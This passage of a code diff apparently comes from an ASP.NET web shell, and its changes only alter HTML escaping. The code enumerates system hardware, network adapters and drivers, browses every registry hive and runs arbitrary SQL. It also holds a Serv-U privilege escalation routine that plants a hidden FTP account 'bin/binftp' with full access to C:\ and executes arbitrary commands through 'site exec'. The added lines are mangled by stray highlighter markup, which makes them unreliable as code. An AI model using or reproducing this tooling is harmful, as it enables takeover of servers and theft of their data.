-yEwc.Append("&lt;li&gt;&lt;u&gt;Server upM : &lt;/u&gt;"+mTG(oZnZV)+"&lt;/li&gt;");
-DataTable dOza=cCf("Win32_NetworkAdapterConfiguration");
-for(int i=0;i&lt;dOza.Rows.Count;i++)
+yEwc.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server upM : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+mTG(oZnZV)+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+DataTable dOza=cCf(&quot;Win32_NetworkAdapterConfiguration&quot;);
+for(int i=0;i<span class="ni">&amp;lt;</span>dOza.Rows.Count;i++)
 {
-hwJeS.Append("&lt;li&gt;&lt;u&gt;Server MAC"+i+" : &lt;/u&gt;"+dOza.Rows[i]["Caption"]+"&lt;/li&gt;");
-if(dOza.Rows[i]["MACAddress"]!=string.Empty)
+hwJeS.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Server MAC&quot;+i+&quot; : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+dOza.Rows[i][&quot;Caption&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
+if(dOza.Rows[i][&quot;MACAddress&quot;]!=string.Empty)
 {
-hwJeS.Append("&lt;li style=\"list-style:none;\"&gt;&lt;u&gt;Address : &lt;/u&gt;"+dOza.Rows[i]["MACAddress"]+"&lt;/li&gt;");
+hwJeS.Append(&quot;<span class="ni">&amp;lt;</span>li style=\&quot;list-style:none;\&quot;<span class="ni">&amp;gt;&amp;lt;</span>u<span class="ni">&amp;gt;</span>Address : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span>&quot;+dOza.Rows[i][&quot;MACAddress&quot;]+&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
 }
 }
-DataTable Driver=cCf("Win32_SystemDriver");
-for (int i=0; i&lt;Driver.Rows.Count; i++)
+DataTable Driver=cCf(&quot;Win32_SystemDriver&quot;);
+for (int i=0; i<span class="ni">&amp;lt;</span>Driver.Rows.Count; i++)
 {
-jXkaE.Append("&lt;li&gt;&lt;u class='u1'&gt;Server Driver"+i+" : &lt;/u&gt;&lt;u class='u2'&gt;"+Driver.Rows[i]["Caption"]+"&lt;/u&gt; ");
-if (Driver.Rows[i]["PathName"]!=string.Empty)
+jXkaE.Append(&quot;<span class="ni">&amp;lt;</span>li<span class="ni">&amp;gt;&amp;lt;</span>u class=&#39;u1&#39;<span class="ni">&amp;gt;</span>Server Driver&quot;+i+&quot; : <span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;&amp;lt;</span>u class=&#39;u2&#39;<span class="ni">&amp;gt;</span>&quot;+Driver.Rows[i][&quot;Caption&quot;]+&quot;<span class="ni">&amp;lt;</span>/u<span class="ni">&amp;gt;</span> &quot;);
+if (Driver.Rows[i][&quot;PathName&quot;]!=string.Empty)
 {
-jXkaE.Append("Path : "+Driver.Rows[i]["PathName"]);
+jXkaE.Append(&quot;Path : &quot;+Driver.Rows[i][&quot;PathName&quot;]);
 }
 else
 {
-jXkaE.Append("No path information");
+jXkaE.Append(&quot;No path information&quot;);
 }
-jXkaE.Append("&lt;/li&gt;");
+jXkaE.Append(&quot;<span class="ni">&amp;lt;</span>/li<span class="ni">&amp;gt;</span>&quot;);
 }
 Bin_Ul_Sys.InnerHtml=yEwc.ToString();
 Bin_Ul_NetConfig.InnerHtml=hwJeS.ToString();
@@ -1219,7 +1218,7 @@ public void ADCpk()
 {
 WICxe();
 APl.Visible=true;
-Bin_H2_Title.InnerText="Serv-U Exec &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;Serv-U Exec <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 }
 public void lDODR()
 {
@@ -1228,17 +1227,17 @@ string user=dNohJ.Value;
 string pass=NMd.Value;
 int port=Int32.Parse(HlQl.Value);
 string cmd=mHbjB.Value;
-string CRtK="user "+user+"\r\n";
-string jnNG="pass "+pass+"\r\n";
-string site="SITE MAINTENANCE\r\n";
-string mtoJb="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
-string sutI="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
-string iVDT="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
-string zexn="QUIT\r\n";
+string CRtK=&quot;user &quot;+user+&quot;\r\n&quot;;
+string jnNG=&quot;pass &quot;+pass+&quot;\r\n&quot;;
+string site=&quot;SITE MAINTENANCE\r\n&quot;;
+string mtoJb=&quot;-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n&quot;;
+string sutI=&quot;-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n&quot;;
+string iVDT=&quot;-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n&quot;;
+string zexn=&quot;QUIT\r\n&quot;;
 UHlA.Visible=true;
 try
 {
-tcp.Connect("127.0.0.1",port);
+tcp.Connect(&quot;127.0.0.1&quot;,port);
 tcp.ReceiveBufferSize=1024;
 NS=tcp.GetStream();
 Rev(NS);
@@ -1254,17 +1253,17 @@ ZJiM(NS,sutI);
 Rev(NS);
 ZJiM(NS,iVDT);
 Rev(NS);
-Bin_Td_Res.InnerHtml+="&lt;font color=\"green\"&gt;&lt;b&gt;Exec Cmd.................\r\n&lt;/b&gt;&lt;/font&gt;";
-zvxm.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);
+Bin_Td_Res.InnerHtml+=&quot;<span class="ni">&amp;lt;</span>font color=\&quot;green\&quot;<span class="ni">&amp;gt;&amp;lt;</span>b<span class="ni">&amp;gt;</span>Exec Cmd.................\r\n<span class="ni">&amp;lt;</span>/b<span class="ni">&amp;gt;&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
+zvxm.Connect(Request.ServerVariables[&quot;LOCAL_ADDR&quot;],52521);
 NS1=zvxm.GetStream();
 Rev(NS1);
-ZJiM(NS1,"user bin\r\n");
+ZJiM(NS1,&quot;user bin\r\n&quot;);
 Rev(NS1);
-ZJiM(NS1,"pass binftp\r\n");
+ZJiM(NS1,&quot;pass binftp\r\n&quot;);
 Rev(NS1);
-ZJiM(NS1,"site exec "+cmd+"\r\n");
+ZJiM(NS1,&quot;site exec &quot;+cmd+&quot;\r\n&quot;);
 Rev(NS1);
-ZJiM(NS1,"quit\r\n");
+ZJiM(NS1,&quot;quit\r\n&quot;);
 Rev(NS1);
 zvxm.Close();
 ZJiM(NS,mtoJb);
@@ -1290,7 +1289,7 @@ FTBtf+=Encoding.Default.GetString(uPZ,0,len);
 }
 while(instream.DataAvailable);
 }
-Bin_Td_Res.InnerHtml+="&lt;font color=red&gt;"+FTBtf.Replace("&#92;&#48;","")+"&lt;/font&gt;";
+Bin_Td_Res.InnerHtml+=&quot;<span class="ni">&amp;lt;</span>font color=red<span class="ni">&amp;gt;</span>&quot;+FTBtf.Replace(&quot;<span class="ni">&amp;#92;&amp;#48;</span>&quot;,&quot;&quot;)+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 protected void ZJiM(NetworkStream instream,string Sendstr)
 {
@@ -1299,91 +1298,91 @@ if(instream.CanWrite)
 byte[] uPZ=Encoding.Default.GetBytes(Sendstr);
 instream.Write(uPZ,0,uPZ.Length);
 }
-Bin_Td_Res.InnerHtml+="&lt;font color=blue&gt;"+Sendstr+"&lt;/font&gt;";
+Bin_Td_Res.InnerHtml+=&quot;<span class="ni">&amp;lt;</span>font color=blue<span class="ni">&amp;gt;</span>&quot;+Sendstr+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 public void xFhz()
 {
 WICxe();
 kkHN.Visible=true;
-Bin_H2_Title.InnerText="RegShell &gt;&gt;";
-string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
-vyX.Text="";
-foreach(string rootkey in txc.Split('|'))
+Bin_H2_Title.InnerText=&quot;RegShell <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
+string txc=@&quot;HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG&quot;;
+vyX.Text=&quot;&quot;;
+foreach(string rootkey in txc.Split(&#39;|&#39;))
 {
-vyX.Text+="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\"&gt;"+rootkey+"&lt;/a&gt; | ";
+vyX.Text+=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Regread&#39;,&#39;&quot;+MVVJ(rootkey)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>&quot;+rootkey+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span> | &quot;;
 }
 lFAvw();
 }
 protected void lFAvw()
 {
-qPdI.Text="";
-string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
+qPdI.Text=&quot;&quot;;
+string txc=@&quot;HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG&quot;;
 TableRow tr;
 TableCell tc;
-foreach(string rootkey in txc.Split('|'))
+foreach(string rootkey in txc.Split(&#39;|&#39;))
 {
 tr=new TableRow();
 tc=new TableCell();
 string bg=OKM();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-tc.Width=Unit.Parse("40%");
-tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\"&gt;"+rootkey+"&lt;/a&gt;";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+tc.Width=Unit.Parse(&quot;40%&quot;);
+tc.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Regread&#39;,&#39;&quot;+MVVJ(rootkey)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>&quot;+rootkey+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(tc);
 tc=new TableCell();
-tc.Width=Unit.Parse("60%");
-tc.Text="&lt;RootKey&gt;";
+tc.Width=Unit.Parse(&quot;60%&quot;);
+tc.Text=&quot;<span class="ni">&amp;lt;</span>RootKey<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(tc);
 pLWD.Rows.Add(tr);
 }
 }
 protected void tpRQ(string Reg_Path)
 {
-if(!Reg_Path.EndsWith("\\"))
+if(!Reg_Path.EndsWith(&quot;\\&quot;))
 {
-Reg_Path=Reg_Path+"\\";
+Reg_Path=Reg_Path+&quot;\\&quot;;
 }
 qPdI.Text=Reg_Path;
-string cJG=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
-cJG=Regex.Replace(cJG,@"\\+","\\");
+string cJG=Regex.Replace(Reg_Path,@&quot;\\[^\\]+\\?$&quot;,&quot;&quot;);
+cJG=Regex.Replace(cJG,@&quot;\\+&quot;,&quot;\\&quot;);
 TableRow tr=new TableRow();
 TableCell tc=new TableCell();
 string bg=OKM();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(cJG)+"')\"&gt;Parent Key&lt;/a&gt;";
-tc.Attributes["colspan"]="2" ;
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+tc.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Regread&#39;,&#39;&quot;+MVVJ(cJG)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>Parent Key<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
+tc.Attributes[&quot;colspan&quot;]=&quot;2&quot; ;
 tr.Cells.Add(tc);
 pLWD.Rows.Add(tr);
 try
 {
 string subpath;
-string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
+string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf(&quot;\\&quot;)+1,Reg_Path.Length-Reg_Path.IndexOf(&quot;\\&quot;)-1);
 RegistryKey rk=null;
 RegistryKey sk;
-if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
+if(Reg_Path.StartsWith(&quot;HKEY_LOCAL_MACHINE&quot;))
 {
 rk=Registry.LocalMachine;
 }
-else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
+else if(Reg_Path.StartsWith(&quot;HKEY_CLASSES_ROOT&quot;))
 {
 rk=Registry.ClassesRoot;
 }
-else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))
+else if(Reg_Path.StartsWith(&quot;HKEY_CURRENT_USER&quot;))
 {
 rk=Registry.CurrentUser;
 }
-else if(Reg_Path.StartsWith("HKEY_USERS"))
+else if(Reg_Path.StartsWith(&quot;HKEY_USERS&quot;))
 {
 rk=Registry.Users;
 }
-else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
+else if(Reg_Path.StartsWith(&quot;HKEY_CURRENT_CONFIG&quot;))
 {
 rk=Registry.CurrentConfig;
 }
-if(kDgkX.Length&gt;1)
+if(kDgkX.Length<span class="ni">&amp;gt;</span>1)
 {
 sk=rk.OpenSubKey(kDgkX);
 }
@@ -1396,24 +1395,24 @@ foreach(string innerSubKey in sk.GetSubKeyNames())
 tr=new TableRow();
 tc=new TableCell();
 bg=OKM();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-tc.Width=Unit.Parse("40%");
-tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(Reg_Path+innerSubKey)+"')\"&gt;"+innerSubKey+"&lt;/a&gt;";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+tc.Width=Unit.Parse(&quot;40%&quot;);
+tc.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Regread&#39;,&#39;&quot;+MVVJ(Reg_Path+innerSubKey)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>&quot;+innerSubKey+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(tc);
 tc=new TableCell();
-tc.Width=Unit.Parse("60%");
-tc.Text="&lt;SubKey&gt;";
+tc.Width=Unit.Parse(&quot;60%&quot;);
+tc.Text=&quot;<span class="ni">&amp;lt;</span>SubKey<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(tc);
 pLWD.Rows.Add(tr);
 }
 TableRow cKVA=new TableRow();
-cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
-cKVA.Attributes["bgcolor"]="#dddddd";
+cKVA.Attributes[&quot;style&quot;]=&quot;border-top:1px solid #fff;border-bottom:1px solid #ddd;&quot;;
+cKVA.Attributes[&quot;bgcolor&quot;]=&quot;#dddddd&quot;;
 TableCell JlmW=new TableCell();
-JlmW.Attributes["colspan"]="2" ;
-JlmW.Attributes["height"]="5";
+JlmW.Attributes[&quot;colspan&quot;]=&quot;2&quot; ;
+JlmW.Attributes[&quot;height&quot;]=&quot;5&quot;;
 cKVA.Cells.Add(JlmW);
 pLWD.Rows.Add(cKVA);
 foreach(string strValueName in sk.GetValueNames())
@@ -1421,14 +1420,14 @@ foreach(string strValueName in sk.GetValueNames())
 tr=new TableRow();
 tc=new TableCell();
 bg=OKM();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-tc.Width=Unit.Parse("40%");
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+tc.Width=Unit.Parse(&quot;40%&quot;);
 tc.Text=strValueName;
 tr.Cells.Add(tc);
 tc=new TableCell();
-tc.Width=Unit.Parse("60%");
+tc.Width=Unit.Parse(&quot;60%&quot;);
 tc.Text=DdmPl(sk,strValueName);
 tr.Cells.Add(tc);
 pLWD.Rows.Add(tr);
@@ -1442,19 +1441,19 @@ xseuB(error.Message);
 public string DdmPl(RegistryKey sk,string strValueName)
 {
 object uPZ;
-string RaTGr="";
+string RaTGr=&quot;&quot;;
 try
 {
-uPZ=sk.GetValue(strValueName,"NULL");
+uPZ=sk.GetValue(strValueName,&quot;NULL&quot;);
 if(uPZ.GetType()==typeof(byte[]))
 {
 foreach(byte tmpbyte in(byte[])uPZ)
 {
-if((int)tmpbyte&lt;16)
+if((int)tmpbyte<span class="ni">&amp;lt;</span>16)
 {
-RaTGr+="0";
+RaTGr+=&quot;0&quot;;
 }
-RaTGr+=tmpbyte.ToString("X");
+RaTGr+=tmpbyte.ToString(&quot;X&quot;);
 }
 }
 else if(uPZ.GetType()==typeof(string[]))
@@ -1479,14 +1478,14 @@ public void vNCHZ()
 {
 WICxe();
 YwLB.Visible=true;
-Bin_H2_Title.InnerText="PortScan &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;PortScan <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 }
 public void rAhe()
 {
 WICxe();
 iDgmL.Visible=true;
 dQIIF.Visible=false;
-Bin_H2_Title.InnerText="DataBase &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;DataBase <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 }
 protected void OUj()
 {
@@ -1539,14 +1538,14 @@ try
 {
 string str;
 OUj();
-query=query+"\r\n";
-MatchCollection gcod=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);
+query=query+&quot;\r\n&quot;;
+MatchCollection gcod=new Regex(&quot;[\r\n][gG][oO][\r\n]&quot;).Matches(query);
 int EmRX=0;
-for(int i=0;i&lt;gcod.Count;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>gcod.Count;i++)
 {
 Match FJD=gcod[i];
 str=query.Substring(EmRX,FJD.Index-EmRX);
-if(str.Trim().Length&gt;0)
+if(str.Trim().Length<span class="ni">&amp;gt;</span>0)
 {
 OleDbDataAdapter FgzeQ=new OleDbDataAdapter();
 Kkvb.CommandType=CommandType.Text;
@@ -1554,7 +1553,7 @@ Kkvb.CommandText=str.Trim();
 FgzeQ.SelectCommand=Kkvb;
 DataSet cDPp=new DataSet();
 FgzeQ.Fill(cDPp);
-for(int j=0;j&lt;cDPp.Tables.Count;j++)
+for(int j=0;j<span class="ni">&amp;lt;</span>cDPp.Tables.Count;j++)
 {
 list.Add(cDPp.Tables[j]);
 }
@@ -1562,7 +1561,7 @@ list.Add(cDPp.Tables[j]);
 EmRX=FJD.Index+3;
 }
 str=query.Substring(EmRX,query.Length-EmRX);
-if(str.Trim().Length&gt;0)
+if(str.Trim().Length<span class="ni">&amp;gt;</span>0)
 {
 OleDbDataAdapter VwB=new OleDbDataAdapter();
 Kkvb.CommandType=CommandType.Text;
@@ -1570,7 +1569,7 @@ Kkvb.CommandText=str.Trim();
 VwB.SelectCommand=Kkvb;
 DataSet arG=new DataSet();
 VwB.Fill(arG);
-for(int k=0;k&lt;arG.Tables.Count;k++)
+for(int k=0;k<span class="ni">&amp;lt;</span>arG.Tables.Count;k++)
 {
 list.Add(arG.Tables[k]);
 }
@@ -1602,28 +1601,28 @@ public void dwgT()
 try
 {
 OUj();
-if(WYmo.SelectedItem.Text=="MSSQL")
+if(WYmo.SelectedItem.Text==&quot;MSSQL&quot;)
 {
-if(Pvf.SelectedItem.Value!="")
+if(Pvf.SelectedItem.Value!=&quot;&quot;)
 {
 Dtdr.ChangeDatabase(Pvf.SelectedItem.Value.ToString());
 }
 }
 DataTable[] jxF=null;
 jxF=Bin_Data(jHIy.InnerText);
-if(jxF!=null && jxF.Length&gt;0)
+if(jxF!=null <span class="err">&amp;&amp;</span> jxF.Length<span class="ni">&amp;gt;</span>0)
 {
-for(int j=0;j&lt;jxF.Length;j++)
+for(int j=0;j<span class="ni">&amp;lt;</span>jxF.Length;j++)
 {
 rom.PreRender+=new EventHandler(lRavM);
 rom.DataSource=jxF[j];
 rom.DataBind();
-for(int i=0;i&lt;rom.Items.Count;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>rom.Items.Count;i++)
 {
 string bg=OKM();
 rom.Items[i].CssClass=bg;
-rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
-rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
+rom.Items[i].Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
+rom.Items[i].Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
 }
 }
 }
@@ -1644,9 +1643,9 @@ public void xTZY()
 {
 try
 {
-if(WYmo.SelectedItem.Text=="MSSQL")
+if(WYmo.SelectedItem.Text==&quot;MSSQL&quot;)
 {
-if(Pvf.SelectedItem.Value=="")
+if(Pvf.SelectedItem.Value==&quot;&quot;)
 {
 rom.DataSource=null;
 rom.DataBind();
@@ -1657,26 +1656,26 @@ OUj();
 DataTable zKvOw=new DataTable();
 DataTable jxF=new DataTable();
 DataTable baVJV=new DataTable();
-if(WYmo.SelectedItem.Text=="MSSQL" && Pvf.SelectedItem.Value!="")
+if(WYmo.SelectedItem.Text==&quot;MSSQL&quot; <span class="err">&amp;&amp;</span> Pvf.SelectedItem.Value!=&quot;&quot;)
 {
 Dtdr.ChangeDatabase(Pvf.SelectedItem.Text);
 }
-zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });
-jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });
+zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,&quot;SYSTEM TABLE&quot; });
+jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,&quot;TABLE&quot; });
 foreach(DataRow dr in zKvOw.Rows)
 {
 jxF.ImportRow(dr);
 }
-jxF.Columns.Remove("TABLE_CATALOG");jxF.Columns.Remove("TABLE_SCHEMA");jxF.Columns.Remove("DESCRIPTION");jxF.Columns.Remove("TABLE_PROPID");
+jxF.Columns.Remove(&quot;TABLE_CATALOG&quot;);jxF.Columns.Remove(&quot;TABLE_SCHEMA&quot;);jxF.Columns.Remove(&quot;DESCRIPTION&quot;);jxF.Columns.Remove(&quot;TABLE_PROPID&quot;);
 rom.PreRender+=new EventHandler(lRavM);
 rom.DataSource=jxF;
 rom.DataBind();
-for(int i=0;i&lt;rom.Items.Count;i++)
+for(int i=0;i<span class="ni">&amp;lt;</span>rom.Items.Count;i++)
 {
 string bg=OKM();
 rom.Items[i].CssClass=bg;
-rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
-rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
+rom.Items[i].Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
+rom.Items[i].Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
 }
 rom.Visible=true;
 }
@@ -1693,7 +1692,7 @@ foreach(DataGridItem item in d.Items)
 {
 foreach(TableCell t in item.Cells)
 {
-t.Text=t.Text.Replace("&lt;","&lt;").Replace("&gt;","&gt;");
+t.Text=t.Text.Replace(&quot;<span class="ni">&amp;lt;</span>&quot;,&quot;<span class="ni">&amp;lt;</span>&quot;).Replace(&quot;<span class="ni">&amp;gt;</span>&quot;,&quot;<span class="ni">&amp;gt;</span>&quot;);
 }
 }
 }
@@ -1703,30 +1702,30 @@ dQIIF.Visible=true;
 try
 {
 jHIy.InnerHtml=string.Empty;
-if(WYmo.SelectedItem.Text=="MSSQL")
+if(WYmo.SelectedItem.Text==&quot;MSSQL&quot;)
 {
 rom.Visible=false;
 uXevN.Visible=true;
 irTU.Visible=true;
 OUj();
-DataTable ver=CYUe(@"SELECT @@VERSION");
-DataTable dbs=CYUe(@"SELECT name FROM master.dbo.sysdatabases");
-DataTable cdb=CYUe(@"SELECT DB_NAME()");
-DataTable rol=CYUe(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
-DataTable YKrm=CYUe(@"SELECT IS_MEMBER('db_owner')");
+DataTable ver=CYUe(@&quot;SELECT @@VERSION&quot;);
+DataTable dbs=CYUe(@&quot;SELECT name FROM master.dbo.sysdatabases&quot;);
+DataTable cdb=CYUe(@&quot;SELECT DB_NAME()&quot;);
+DataTable rol=CYUe(@&quot;SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)&quot;);
+DataTable YKrm=CYUe(@&quot;SELECT IS_MEMBER(&#39;db_owner&#39;)&quot;);
 string jHlh=ver.Rows[0][0].ToString();
 string dbo=string.Empty;
-if(YKrm.Rows[0][0].ToString()=="1")
+if(YKrm.Rows[0][0].ToString()==&quot;1&quot;)
 {
-dbo="db_owner";
+dbo=&quot;db_owner&quot;;
 }
 else
 {
-dbo="public";
+dbo=&quot;public&quot;;
 }
-if(rol.Rows[0][0].ToString()=="1")
+if(rol.Rows[0][0].ToString()==&quot;1&quot;)
 {
-dbo="&lt;font color=blue&gt;sa&lt;/font&gt;";
+dbo=&quot;<span class="ni">&amp;lt;</span>font color=blue<span class="ni">&amp;gt;</span>sa<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 string db_name=string.Empty;
 foreach(ListItem item in FGEy.Items)
@@ -1737,14 +1736,14 @@ foreach(ListItem item in FGEy.Items)
  }
 }
 Pvf.Items.Clear();
-Pvf.Items.Add("-- Select a DataBase --");
-Pvf.Items[0].Value="";
-for(int i=0;i&lt;dbs.Rows.Count;i++)
+Pvf.Items.Add(&quot;-- Select a DataBase --&quot;);
+Pvf.Items[0].Value=&quot;&quot;;
+for(int i=0;i<span class="ni">&amp;lt;</span>dbs.Rows.Count;i++)
 {
-db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),"&lt;font color=blue&gt;"+cdb.Rows[0][0].ToString()+"&lt;/font&gt;")+"&nbsp;|&nbsp;";
+db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),&quot;<span class="ni">&amp;lt;</span>font color=blue<span class="ni">&amp;gt;</span>&quot;+cdb.Rows[0][0].ToString()+&quot;<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;)+&quot;<span class="ni">&amp;nbsp;</span>|<span class="ni">&amp;nbsp;</span>&quot;;
 Pvf.Items.Add(dbs.Rows[i][0].ToString());
 }
